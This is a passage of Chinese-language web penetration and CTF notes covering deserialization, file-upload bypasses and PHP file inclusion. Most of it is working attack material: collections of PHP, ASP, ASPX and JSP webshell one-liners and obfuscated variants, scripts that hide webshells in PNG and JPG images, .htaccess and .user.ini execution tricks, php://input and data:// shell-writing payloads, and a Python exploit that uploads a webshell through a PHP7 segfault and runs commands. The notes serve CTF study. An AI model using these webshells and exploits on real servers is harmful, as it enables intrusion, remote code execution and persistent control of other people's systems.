    3.访问8161端口的web管理页面，读取消息，触发漏洞
    使用jmet进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。

    jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。

* `SerializationDumper`

    

## 常用函数

* `ObjectInputStream.readObject`

* `ObjectInputStream.readUnshared`

* `XMLDecoder.readObject`

* `XStream.fromXML`

* `ObjectMapper.readValue`

* `JSON parseObject`

# JavaScript

## 常用函数

* 弹窗

    ```js

    alert()     警告框，点确认
    confirm()   确认框，确认与取消
    prompt()    消息提示，可能有其他输入信息的交互

    ```

* 编码解码

    ```js

    atob()      ascii to binary解码base64
    btoa()      binary to ascii编码为base64

    ```

## 原型链污染

>[P神文章](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html)

* 概念

    整体上理解起来和模板注入有相似之处，不过也是因为js是面向对象编程，所以在使用上和java、python有共同点

    整体流程->新建一个类的对象->通过__proto__方法更改该对象原型中的属性值->再使用该类创建对象的时候，会自动继承已经修改进去的值

* 基础语句

    

# 文件上传

>(Web漏洞_文件上传总结(前端js验证、后端验证、DVWA1.9版本实验)
)[https://blog.csdn.net/BeatRex/article/details/84625658]
一篇不错的博客拿来借鉴

## 前端验证
* 通过浏览器审查元素对网页的代码查看，找到对文件格式或大小的限制然后修改即可

* 通过Burpsuite工具对浏览器进行代理，抓包对包里的内容进行修改

* 浏览器禁用JavaScript脚本

## 后端验证

* MIME类型验证
* 文件后缀验证

    用其他可能没被禁用掉但是可以被解析为php的后缀

    php5、phtml、php4、pht

* 文件路径验证（权限问题）
* 文件内容验证

### 类型绕过

* 改MIME
* 改数据包的content-type字段
* 改文件头
* 利用服务器解析漏洞
* 点绕过
* $data::绕过

* 00截断

    0x00在ascii中表示NULL，C语言中处理到NULL表示终止，高级语言的底层几乎都是用C语言实现的，所以插入%00或0x00可以导致函数处理终止，不对后面数据进行处理

    >00截断是操作系统层的漏洞，由于操作系统是C语言或汇编语言编写的，这两种语言在定义字符串时，都是以\0（即0x00）作为字符串的结尾。操作系统在识别字符串时，当读取到\0字符时，就认为读取到了一个字符串的结束符号。因此，我们可以通过修改数据包，插入\0字符的方式，达到字符串截断的目的。00截断通常用来绕过web软waf的白名单限制。

    


## 一句话木马

* 简介

    Webshell是指以asp,jsp,php或者cgi等网页形式存在的以中`命令执行环境`，也可以叫做网页后门

    由于webshell大多是以动态脚本形式出现，有人称之为网站的后门工具，`常常被站长用来管理网站`

    但是一旦被攻击者得到可以利用它来达到长期控制网站服务器的目的，并获得执行权限

* 
    >要注意的是一句话里面的“[]”可以替换为“{}”
    * php 
        
        ```php
        <?php @eval($_POST[x]);?>
        <?php system($_GET['cmd']);?>
        <?php assert($_REQUEST[cmd]);?>
        
        <?php @preg_replace("/abc/e",$_REQUEST['cmd'],"abcd");?>

        <?php
        $func =create_function('',$_REQUEST['cmd']);
        $func();
        ?>

        ```

    * asp

        ```s
        
        <%eval request("777")%>
        
        <%execute request("777")%>
        
        <%execute(request("777"))%>

        <%executeGlobal request("777")%>

        <%eval(Request(chr(35)))%> #ASCII码值

        <%response.write server.createobject("wscript.shell").exec("cmd.exe /c "&request("cmd")).stdout.readall%>

        ```

    * aspx

        `<%@ Paage Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>`

    * phtml

        `<script Language="php">eval($_REQUEST[shell])</script>`

    * jsp

        >执行系统命令且有回显
        ```jsp
        <% if("023".equals(request.getParameter("pwd"))){ java.io.InputStream in = 
        Runtime.getRuntime().exec(request.getParameter("i")).getInputStream(); int a = -1; byte[] b = new byte[2048]; 
        out.print("<pre>");
        while((a=in.read(b))!=-1){
        out.println(new String(b,0,a));
        }out.print("</pre>");
        }%>

        <%execute request(“value”)%> 
        ```

## 图片马

* 常用图片马生成方式

    copy 1.jpg/b + 2.php/a  3.jpg

    `/b`指的是以binary二进制方式将文件结合

    `/a`指的是将两个文件文本进行拼接

    不过也可以编辑器打开图片然后直接在末尾加入一句话木马

## 二次渲染

* 原理

    png图片由3个以上的数据块组成.

    PNG定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，这是标准的数据块，另一种叫做辅助数据块(ancillary chunks)，这是可选的数据块。关键数据块定义了3个标准数据块(IHDR,IDAT, IEND)，每个PNG文件都必须包含它们.

    数据块结构

    

    
* gif二次渲染

    只要下载处理过的图片，找到没有发生变化的区块，把马写入即可

* png二次渲染脚本

    png图片马脚本：同目录下要有一个1.png文件，然后在本目录下打开cmd输 php png-IDAT.php     然后图片就渲染好了，上传就行

    ```php

    <?php
    $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
            0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
            0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
            0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
            0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
            0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
            0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
            0x66, 0x44, 0x50, 0x33);

    $img = imagecreatetruecolor(32, 32);

    for ($y = 0; $y < sizeof($p); $y += 3) {
    $r = $p[$y];
    $g = $p[$y+1];
    $b = $p[$y+2];
    $color = imagecolorallocate($img, $r, $g, $b);
    imagesetpixel($img, round($y / 3), 0, $color);
    }

    imagepng($img,'./1.png');
    ?>

    ```

* jpg二次渲染脚本

    jpg图片马脚本：同目录下要有1.jpg，运行 php jpg_payload.php 1.jpg

    ```php

    <?php
        /*

        The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
        It is necessary that the size and quality of the initial image are the same as those of the processed image.

        1) Upload an arbitrary image via secured files upload script
        2) Save the processed image and launch:
        jpg_payload.php <jpg_name.jpg>

        In case of successful injection you will get a specially crafted image, which should be uploaded again.

        Since the most straightforward injection method is used, the following problems can occur:
        1) After the second processing the injected data may become partially corrupted.
        2) The jpg_payload.php script outputs "Something's wrong".
        If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

        Sergey Bobrov @Black2Fan.

        See also:
        https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

        */

        $miniPayload = "<?php system('tac f*');?>";


        if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
            die('php-gd is not installed');
        }

        if(!isset($argv[1])) {
            die('php jpg_payload.php <jpg_name.jpg>');
        }

        set_error_handler("custom_error_handler");

        for($pad = 0; $pad < 1024; $pad++) {
            $nullbytePayloadSize = $pad;
            $dis = new DataInputStream($argv[1]);
            $outStream = file_get_contents($argv[1]);
            $extraBytes = 0;
            $correctImage = TRUE;

            if($dis->readShort() != 0xFFD8) {
                die('Incorrect SOI marker');
            }

            while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
                $marker = $dis->readByte();
                $size = $dis->readShort() - 2;
                $dis->skip($size);
                if($marker === 0xDA) {
                    $startPos = $dis->seek();
                    $outStreamTmp = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        str_repeat("\0",$nullbytePayloadSize) . 
                        substr($outStream, $startPos);
                    checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                    if($extraBytes !== 0) {
                        while((!$dis->eof())) {
                            if($dis->readByte() === 0xFF) {
                                if($dis->readByte !== 0x00) {
                                    break;
                                }
                            }
                        }
                        $stopPos = $dis->seek() - 2;
                        $imageStreamSize = $stopPos - $startPos;
                        $outStream = 
                            substr($outStream, 0, $startPos) . 
                            $miniPayload . 
                            substr(
                                str_repeat("\0",$nullbytePayloadSize).
                                    substr($outStream, $startPos, $imageStreamSize),
                                0,
                                $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                    substr($outStream, $stopPos);
                    } elseif($correctImage) {
                        $outStream = $outStreamTmp;
                    } else {
                        break;
                    }
                    if(checkImage('payload_'.$argv[1], $outStream)) {
                        die('Success!');
                    } else {
                        break;
                    }
                }
            }
        }
        unlink('payload_'.$argv[1]);
        die('Something\'s wrong');

        function checkImage($filename, $data, $unlink = FALSE) {
            global $correctImage;
            file_put_contents($filename, $data);
            $correctImage = TRUE;
            imagecreatefromjpeg($filename);
            if($unlink)
                unlink($filename);
            return $correctImage;
        }

        function custom_error_handler($errno, $errstr, $errfile, $errline) {
            global $extraBytes, $correctImage;
            $correctImage = FALSE;
            if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
                if(isset($m[1])) {
                    $extraBytes = (int)$m[1];
                }
            }
        }

        class DataInputStream {
            private $binData;
            private $order;
            private $size;

            public function __construct($filename, $order = false, $fromString = false) {
                $this->binData = '';
                $this->order = $order;
                if(!$fromString) {
                    if(!file_exists($filename) || !is_file($filename))
                        die('File not exists ['.$filename.']');
                    $this->binData = file_get_contents($filename);
                } else {
                    $this->binData = $filename;
                }
                $this->size = strlen($this->binData);
            }

            public function seek() {
                return ($this->size - strlen($this->binData));
            }

            public function skip($skip) {
                $this->binData = substr($this->binData, $skip);
            }

            public function readByte() {
                if($this->eof()) {
                    die('End Of File');
                }
                $byte = substr($this->binData, 0, 1);
                $this->binData = substr($this->binData, 1);
                return ord($byte);
            }

            public function readShort() {
                if(strlen($this->binData) < 2) {
                    die('End Of File');
                }
                $short = substr($this->binData, 0, 2);
                $this->binData = substr($this->binData, 2);
                if($this->order) {
                    $short = (ord($short[1]) << 8) + ord($short[0]);
                } else {
                    $short = (ord($short[0]) << 8) + ord($short[1]);
                }
                return $short;
            }

            public function eof() {
                return !$this->binData||(strlen($this->binData) === 0);
            }
        }
    ?>


    ```

## 配置文件

* .htaccess

    htaccess是超文本访问（Hypertext Access）的缩写，是一个基于Apache的Web服务器使用的配置文件，用于控制它所在的目录以及该目录下的所有子目录。

    .htaccess文件的主要功能包括使用密码保护文件夹，禁止或允许用户使用IP地址访问，禁止目录浏览，将用户自动重定向到另一个页面或目录，创建和使用自定义错误页面，改变具有特定扩展名的文件的使用方式，或者通过指定文件扩展名或特定文件作为主页。

    许多服务器还允许开发人员在各个目录中创建特殊的配置文件，以便覆盖或添加一个或多个全局设置。例如，Apache 服务器将从一个名为（.htaccess如果存在）的文件中加载特定于目录的配置。Web 服务器使用这些类型的配置文件，但通常不允许您使用 HTTP 请求访问它们。但是，您可能偶尔会发现无法阻止您上传自己的恶意配置文件的服务器在这种情况下，即使您需要的文件扩展名被列入黑名单，您也可以欺骗服务器将任意自定义文件扩展名映射到可执行的 MIME 类型。
    
    如果当你上传文件的时候发现你的脚本文件被阻止上传，你可以尝试上传.htaccess文件。在.htaccess文件里面将你的文件扩展名映射到可执行MIME类型。`只需要添加一句话：`
    
    
    .htaccess是伪静态环境配置文件，用于lamp,apache

    ```php

    AddType application/x-httpd-php .html（则html文件也能执行.php文件
    
    AddType application/x-httpd-php .txt（则普通的文本文档也能执行.php文件

    //或者用下面的指定某个文件的解析方式

    <FilesMatch "文件名"> 
    SetHandler application/x-httpd-php 
    </FilesMatch>
    ```

* .user.ini

    >[参见----->](https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html)
    
    (1)服务器脚本语言为PHP 服务器使用CGI／FastCGI模式
    (2)上传目录下要有可执行的php文件


    `.user.ini`是`lnmp`文件，里面放的是网站的文件夹路径地址，目的是放指跨目录访问和文件跨目录读取

    .user.ini只对他同一目录下的文件起作用

    自`PHP5.3.0`起，PHP支持基于每个目录的INI文件配置，此类文件仅被CGI/FastCGI SAPI处理。此功能使得 PECL 的 htscanner 扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。 

    除了`主php.ini`之外，PHP还会在每个目录下扫描INI文件，从被执行的PHP文件所在目录开始一直上升到`web根目录`($_SERVER['DOCUMENT_ROOT']所指定的)。如果被执行的PHP文件在web个目录之外，则`只扫描该目录`。

    在`.user.ini`风格的INI文件中只有具有`PHP_INI-PERDIR`和`PHP_INI_USER`模式的INI设置可被识别。

    两个新的INI指令，`user_ini.filename`和`user_ini.cache_ttl`控制着用户INI文件的使用。

    `user_ini.filename`设定了PHP会在每个根目录下搜寻的文件名；如果设定为空字符串则PHP不会搜寻。默认值是`.user.ini`。
    
    `user_ini.cache_ttl`控制着重新读取用户INI文件的间隔时间。默认是`300秒(5分钟)`。

    index.php  .user.ini

    ```php
    
    auto_append_file=//在文件底部加载文件
    auto_prepend_file=//在文件顶部加载文件

    ```   

## 解析漏洞

* Apache

    >https://blog.csdn.net/weixin_44174581/article/details/119387616

    * 多后缀解析
    
        范围:1.x/2.x版本，测试2.0 2.2存在
        
        Apache默认一个文件可以有多个用.分割得后缀，当最右边的后缀无法识别（mime.types文件中的为合法后缀）则继续向左看，直到碰到合法后缀才进行解析（以最后一个合法后缀为准）

        在有多个后缀的情况下，只要包含.php后缀的文件就会被识别出php文件进行解析，`不需要是最后一个后缀`
    
    * 换行解析漏洞

        影响范围：2.4.0-2.4.29版本
        
        原因：合法后缀配置文件中的正则表达式中$不仅匹配字符串结尾位置，还可以匹配\n或\r，在解析php时，1.php\x0A将按照.php进行解析，而`’.php\x0A’ != ‘.php’`
        可能过滤时过滤了.php但没有过滤.php\x0A从而实现绕过。

        .htaccess添加
        
        ```php

        <FilesMatch \.php$>
            SetHandler application/x-httpd-php
        <FilesMatech>

        ```

        限制：获取文件名时不能用$_FILES[‘file’][‘name’]，因为它会自动把换行去掉。

* IIS

    * 5.x/6.0

        目录解析：.asp/.asa等可执行文件后缀为后缀的文件名，目录下任意文件都当作可执行文件解析
        
        文件解析：文件名分号后的后缀不解析,xxx.asp;.jpg，asa,cer,cdx都可以

        
    * 7.0/7.5
	    
        Fast-CGI开启情况下
	
        传一个xxx.jpg，访问的时候为xxx.jpg/.php，会将该图片内容以php解析


* nginx

	影响版本：nginx<8.03
    
    0.5.， 0.6.， 0.7 <= 0.7.65， 0.8 <= 0.8.37
	
    空字节代码执行
		
    nginx图片中放入PHP代码，访问时`xxx.jpg%00.php`
    
	C语言函数匹配到%00即NULL字符会终止

    可以kali下`man ascii`查看ascii码转换表


## 常见文件头
JPEG (jpg)，                        　　文件头：FFD8FF　　　　　　　　　　　　　　
PNG (png)，                       　　 文件头：89504E47  文件尾：0000000049454E44AE426082
GIF (gif)，      GIF89A                     　　文件头：47494638
ZIP Archive (zip)，                     文件头：504B0304 文件尾：00000000
TIFF (tif)，                           　  文件头：49492A00
Windows Bitmap (bmp)，      　  文件头：424D
CAD (dwg)，                        　  文件头：41433130
Adobe Photoshop (psd)，          文件头：38425053
Rich Text Format (rtf)，             文件头：7B5C727466
XML (xml)，                              文件头：3C3F786D6C
HTML (html)，                           文件头：68746D6C3E
Email [thorough only] (eml)，     文件头：44656C69766572792D646174653A
Outlook Express (dbx)，            文件头：CFAD12FEC5FD746F
Outlook (pst)，                         文件头：2142444E
MS Word/Excel (xls.or.doc)，      文件头：D0CF11E0
MS Access (mdb)，                    文件头：5374616E64617264204A
WordPerfect (wpd)，                  文件头：FF575043
Adobe Acrobat (pdf)，               文件头：255044462D312E
Quicken (qdf)，                         文件头：AC9EBD8F
Windows Password (pwl)，         文件头：E3828596
RAR Archive (rar)，                    文件头：52617221
Wave (wav)，                            文件头：57415645
AVI (avi)，                                 文件头：41564920
Real Audio (ram)，                     文件头：2E7261FD
Real Media (rm)，                       文件头：2E524D46
MPEG (mpg)，                           文件头：000001BA
MPEG (mpg)，                           文件头：000001B3
Quicktime (mov)，                     文件头：6D6F6F76
Windows Media (asf)，               文件头：3026B2758E66CF11
MIDI (mid)，                              文件头：4D546864 

## 常见MIME类型

* `zip`
    
    Content-Type: application/x-zip-compressed

    超文本标记语言文本 .html text/html
　　xml文档 .xml text/xml
　　XHTML文档 .xhtml application/xhtml+xml
　　普通文本 .txt text/plain
　　RTF文本 .rtf application/rtf
　　PDF文档 .pdf application/pdf
　　Microsoft Word文件 .word application/msword
　　PNG图像 .png image/png
　　GIF图形 .gif image/gif
　　JPEG图形 .jpeg,.jpg image/jpeg
　　au声音文件 .au audio/basic
　　MIDI音乐文件 mid,.midi audio/midi,audio/x-midi
　　RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio
　　MPEG文件 .mpg,.mpeg video/mpeg
　　AVI文件 .avi video/x-msvideo
　　GZIP文件 .gz application/x-gzip
　　TAR文件 .tar application/x-tar
　　任意的二进制数据 application/octet-stream

## 骚操作写马
>https://yn8rt.blog.csdn.net/article/details/119425905

>通过对特定组合字符进行操作来拼接出一句话

* 111

```php
$a="s#y#s#t#e#m";
$b=explode("#",$a);
$c=$b[0].$b[1].$b[2].$b[3].$b[4].$b[5].$b[6];
$c($_REQUEST[1]);

```

* 222
```php
$a=substr("1s",1).'ystem';
$a($_REQUEST[1]);
```

* 333
```php
$a=strrev('metsys');
$a($_REQUEST[1]);

```

* 444
```php
$a=$_REQUEST['a'];
$b=$_REQUEST['b'];
$a($b);

```

## 小技巧

* 传文件

    >ctfshow 169
    传zip改content-type为image/png，然后利用日志包含auto_append_file=/var/log/nginx/access.log

# 文件包含

>常用来写入shell、命令执行

>[安全运营内刊-文件包含漏洞利用思路与防御措施](http://www.topsec.com.cn/article/5023.html)

文件包含是一个功能，在各种开发语言中都提供了内置的文件包含函数，可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。

文件包含函数在代码设计中被经常使用到，大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题，但有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来。这种情况下，如果没有做好足够的安全设计，则可能导致客户端被攻击者非法调用恶意文件，造成文件包含漏洞。

文件包含漏洞分为本地文件包含(Loacl File Inclusion,`LFI`)和远程文件包含(Remote File Inclusion,`RFI`)两种。通过文件包含漏洞，攻击者可以读取系统中的敏感文件，源代码文件等。例如通过对密码文件进行暴力破解，若成功则可获取操作系统的用户账户等敏感信息，甚至可通过开放的远程连接服务进行连接控制。另外不论是本地文件包含或是远程文件包含，都有可能导致任意代码执行漏洞。

文件包含形成的原因是php.ini里面的安全设置: allow_url_include打开为远程文件包含, 关闭为本地文件包含：

任意文件都可以被包含，当中如果有php代码则会被执行，若不是php代码会被完全展示出来

本地文件包含漏洞能查看或运行本地文件，可以使用PHP的伪协议等方式来利用本地文件包含漏洞，常见以下利用场景：

-   PHP伪协议
-   包含Session文件
-   包含日志
-   包含environ文件
-   包含临时文件
-   包含上传文件

## 相关函数

* include()

    包含文件，如果语句执行有错误，产生警告warning并继续执行后面的语句

* require()

    包含文件，如果语句执行有错误，产生报错Error并停止后续代码执行

* include_once()

    只包含一次，如果后续再使用include_once()进行包含先前文件，将不会包含

    ```php

    //主文件

    <?php
    
    $a=1;
    include_once('test.php');
    echo $a."<br>";
    include('test.php');
    echo $a."<br>";
    include_once('test.php');
    echo $a."<br>";
    include_once('test.php');
    echo $a."<br>";
    include('test.php');
    echo $a."<br>";

    ?>


    //待包含文件test.php
    <?php $a++;?>

    //访问主文件结果
    2
    3
    3
    3
    4

    ```

* require_once()

## 常用伪协议

>https://www.php.net/manual/zh/wrappers.data.php


* `流`的概念

    流（Stream）是一个抽象的概念，它是指一连串的数据，这些数据可能是连续的一段二进制数据，也可能是一个字符序列。在程序中，流可以用来读取或写入数据。流与传统的文件操作不同，它不需要一次性将整个文件读取到内存中，而是会按照一定的块（Block）大小，逐块读取或写入数据。

    在 PHP 中，流是通过 PHP 脚本与 I/O 设备之间进行数据传输的一种机制。例如，读取一个 URL 返回的 HTML 内容，就需要使用 PHP 的流函数和标准输入输出流（stdin/stdout）对数据进行交互。PHP 的流可以用于网络上的数据传输、文件操作、图像处理等诸多方面。

* `php://filter`

    php://filter是一种元封装器，设计用于“数据流”打开时的“筛选过滤”应用，对本地磁盘文件进行读写。简单来讲就是可以在执行代码前将代码换个方式读取出来，只是读取需要开启allow_url_fopen，不需开启allow_url_include。

    使用php://filter读取本地文件，输出内容是base64加密过的，需要进行解密，如果不进行base64_encode，则被包含进来的代码就会被执行，导致看不到源代码。

    `php://filter/read=convert.base64-encode/resource=xxx.php`(读文件源码)

    `php://filter/write=string.rot13/resource=2.php`(写入文件，相当于打开一个写入的文件流，新建一个文件并指定写的方式)

    `?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=payload.php`

    `&contents=?<hp pvela$(P_SO[T]1;)>?`


    `php://filter/resource=flag.php`(读文件源码)

    `php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php`(读文件源码)

    `php://filter/read=convert.quoted-printable-encode/resource=flag.php`(读文件源码)

    `compress.zlib://flag.php`(读文件源码)

* `php://input`

    是一个可以访问原始数据的只读流

    条件：allow_url_include为ON。

    php://input协议主要用于访问各个输入/输出流，经常使用file_get_contents获取php://input内容(POST)，并且当enctype="multipart/form-data"的时候 php://input是无效的。

    ```php

    <?php 
    $res = file_get_contents("php://input")
    vat_dump($res);    
    ?>

    ```

    `file_get_contents(php://input)`接收post数据//ctfshow 266

    `php://input <?PHP fputs(fopen('shell.php','w'),"<?php eval($_REQUEST[c])?>)"?>` (写入shell)

    如果发现没有生效，可以先在hackbar中放入要写的内容，加上等号，burp抓包，一定要加等号，要不然无法识别键值对，然后在包中改请求体即可

    `php://input <?php system('whoami');?>`

* `data://text`

    条件：php.ini：allow_url_include=On、allow_url_fopen()都为On。

    利用data://伪协议进行代码执行的思路原理和php://是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中。

    ```php

    <?php
    echo 'for test';
    include($_GET['file']);
    ?>

    ```

    `data://text/plain,<?php phpinfo();?>`(相当于代码执行)

    `data://text/plain;base64,xxxxxx`(打印内容)

    `data://,php-code`(代码执行2)
    
    `data:,<?phpinfo();?>`(代码执行3)

* `zlib://`压缩流

    `compress.zlib://a.txt`(读文件)
    `compress.bzip2://file.bz2`

* `phar://`读压缩包

    phar://1.zip/1.php

    php版本 ≥ 5.3

    phar协议的作用是归档，是从PHP 5.3.0 开始有效，Phar归档文件最有特色的特点是可以方便地将多个文件分组为一个文件，phar归档文件提供了一种将完整的PHP应用程序分发到单个文件中并从该文件运行它的方法，而无需将其提取到磁盘中。phar 可以处理tar和zip文件，当文件上传仅仅校验mime类型与文件后缀，可以通过以下方式进行利用。

    ```php

    利用方式：写入一句话shell.php -> 压缩为shell.zip -> 修改后缀为shell.jpg ->上传到网站 -> phar://shell.jpg/shell.php.

    ```

    这个就是php解压缩报的一个函数，不管后缀是什么，都会当做压缩包来解压，用法：?file=phar://压缩包/内部文件

    注意 PHP>=5.3.0压缩包需要是zip协议压缩，rar不行

    phar://./uploads/4h214215521321.jpg/1.php

    生成phar文件
    
    ```php

    <?php
        class TestObject {
        }
        $phar = new Phar("phar.phar"); //后缀名必须为phar
        $phar->startBuffering();
        $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
        $o = new TestObject();
        $o -> data='hu3sky';
        $phar->setMetadata($o); //将自定义的meta-data存入manifest
        $phar->addFromString("test.txt", "test"); //添加要压缩的文件
        //签名自动计算
        $phar->stopBuffering();
    ?>
    ```

    ```php
    
    $phar = new Phar("exp.phar"); //生成phar文件
    $phar->startBuffering();
    $phar->setStub('<?php __HALT_COMPILER(); ? >');
    $phar->setMetadata($a); //触发类是C1e4r类
    $phar->addFromString("exp.txt", "test"); //签名
    $phar->stopBuffering();
    ```

* `zip://`

    条件：php版本 ≥ 5.3

    利用：和构造zip包的方法同phar://协议，但使用zip协议，需要指定绝对路径，同时将#编码为%23，之后填上压缩包内的文件。

    实例：

    ```php

    指定绝对路径：
    test.php?file=zip://E:/phpstudy_pro/WWW/phpinfo.zip%23phpinfo.txt.

    ```
    
## 日志包含

>[包含日志文件getshell](https://www.cnblogs.com/my1e3/p/5854897.html)

* 概述

    当没有上传点，也没有`url_allow_include()`功能时，我们可以考虑包含`服务器的日志文件`，原理是，当访问网站时日志会记录我们的行为，如果访问连接中包含一句话吗木马，也会被记录到日志中。这时候我们如果知道服务器的日志位置，我们可以去包含这个文件从而`拿到shell`，关键步骤就是找日志存放的`物理路径`。

* 条件

    获取服务器日志的具体存储路径，且日志文件权限为可读

* 写shell

    ```php

    <?php $file = fopen('c.php','w');fputs($file,'<?php@eval($_REQUEST[666]);?>')?>

    ```

### 日志路径

>[linux系统 var log下日志说明](https://blog.csdn.net/weixin_35834687/article/details/116689352)

* linux

    * 登录日志

        ```
        
        /var/log/auth.log：Ubuntu、Debian等使用的认证日志文件，包含ssh登录、su切换等认证信息。

        /var/log/secure：CentOS、RedHat等使用的认证日志文件，与auth.log类似。

        /var/log/messages：包含系统消息和错误信息，也包括部分登录信息，例如su和sudo的使用等。

        /var/log/wtmp：登录记录文件，记录系统的每个用户登录和注销的时间、终端等信息。

        /var/log/btmp：登录失败记录文件，记录系统中登录失败的信息。

        /var/log/lastlog：记录系统中每个用户最近一次登录的时间、IP地址等信息。

        ```

    * nginx

        `/var/log/nginx/access.log`

    * ssh

        `var/log/auth.log`

    * 记录登陆系统存取数据的文件

        `var/log/secure`//例如:pop3，ssh，telnet，ftp等都会记录在此.

    * apache

        ```php
        
        /var/log/apache/access.log
        /var/log/apache2/access.log
        /var/www/logs/access.log
        /var/log/access.log

        ```
* windows

    * apache

        `apache/logs/access.log`
        `apache/logs/error.log`

## 临时文件包含

### 前置知识

* `$_FILES`
    
    在PHP中可以使用POST方法或者PUT方法进行文本和二进制文件的上传。上传的文件信息会保存在全局变量$_FILES里。

    ```php
    
    $_FILES['userfile']['name'] 客户端文件的原名称。
    $_FILES['userfile']['type'] 文件的 MIME 类型，如果浏览器提供该信息的支持，例如"image/gif"。
    $_FILES['userfile']['size'] 已上传文件的大小，单位为字节。
    $_FILES['userfile']['tmp_name'] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。
    $_FILES['userfile']['error'] 该文件上传的错误代码，上传成功其值为0，否则为错误信息。
    
    ```

* 存储目录

    文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由php.ini的`upload_tmp_dir`属性指定，假如`upload_tmp_dir`的路径不可写，PHP会上传到系统默认的临时目录中。

    linux下:`/tmp`格式通常是（`/tmp/php[6个随机字符]`）

    Windows下:`C:/Windows`或`C:/Windows/Temp`格式通常是（`C:/Windows/php[4个随机字符].tmp`）


### session包含(无后缀文件包含)

* `PHP_SESSION_UPLOAD_PROGRESS`

    >参见[利用session.upload_progress进行文件包含和反序列化渗透 ](https://www.freebuf.com/news/202819.html)

* 概述

    当向服务器上传一个文件的时候，服务器会把文件上传的时间以及进度保存在session当中，当上传文件结束之后就会立即清空session文件中的内容。

    如果`session.use_strict_mode`值默认为0，可以自定义设置`Session ID`，如果设置`PHPSESSID=TGAO`,那么对应的文件就会上传到`/tmp/sess_TGAO`,可以看出文件后面的字段是可以被控制的

* 条件

    1.Session文件路径已知，且其中内容的部分可控。

    首先第一个条件：Session的文件路径可以在phpinfo中的session.save_path字段查看到

    2.内容可控，这个要求较为苛刻，有些时候可以通过先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量。从而利用变量来写入payload，并之后再次包含从而执行php代码。

* 基本思路

    先向指定页面构造一个上传文件的包，然后在包中修改`PHP_SESSION_UPLOAD_PROGRESS`内容，包含命令执行`POST[2]`，然后对该临时文件进行包含，然后就可以利用`post[2]`进行命令执行，要利用`2`参数在指定路径下生成一个后门文件，其中有`eval()`函数执行，然后访问该文件，`POST`入想要执行的命令就行

    当然，`SESSION`文件临时存在，文件上传完成之后就会进行删除，所以要利用条件竞争先包含到文件进行命令执行，具体脚本见`脚本`模块

## PHP7 Segment Fault

>https://www.codenong.com/cs106498971/

* 利用条件

    CVE-2018-14884

    7.0.0 <= PHP Version < 7.0.28


* 利用原理

    php代码中使用`php://filter的strip_tags` 过滤器, 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除而不像phpinfo那样上传的文件很快就会被删除，这样的情况下我们只需要知道其文件名就可以包含我们的恶意代码。

    `http://192.33.6.145/index.php?file=php://filter/string.strip_tags/resource=/etc/passwd`

    这种 包含 会导致php执行过程中出现segment fault，此时 上传文件，临时文件会被保存在`upload_tmp_dir`所指定的目录下，不会被删除，这样就能达成getshell的目的。

* 场景

    ```php
    //index.php

    <?php
        $a = @$_GET['file'];
        include $a;
    ?>

    //dir.php

    <?php
        $a = @$_GET['dir'];
        var_dump(scandir($a));
    ?>
    
    ```

* exp
    
    ```python

    #python version 2.7

    import requests
    from io import BytesIO
    import re

    files = {
    'file': BytesIO('<?php eval($_REQUEST[Qftm]);')
    }
    url1 = 'http://192.168.68.119/index.php?file=php://filter/string.strip_tags/resource=index.php'
    r = requests.post(url=url1, files=files, allow_redirects=False)

    url2 = 'http://192.168.68.119/dir.php?dir=/tmp/'
    r = requests.get(url2)
    data = re.search(r"php[a-zA-Z0-9]{1,}", r.content).group(0)

    print "++++++++++++++++++++++"
    print data
    print "++++++++++++++++++++++"

    url3='http://192.168.68.119/index.php?file=/tmp/'+data
    data = {
    'Qftm':"system('whoami');"
    }
    r =  requests.post(url=url3,data=data)
    print r.content
    
    
    ```

* 注

    如果没有类似dir.php的文件可以查看tmp目录下的文件，那可以目录爆破,linux下php六个字符,windows下php四个字符

## 包含environ文件

* 原理

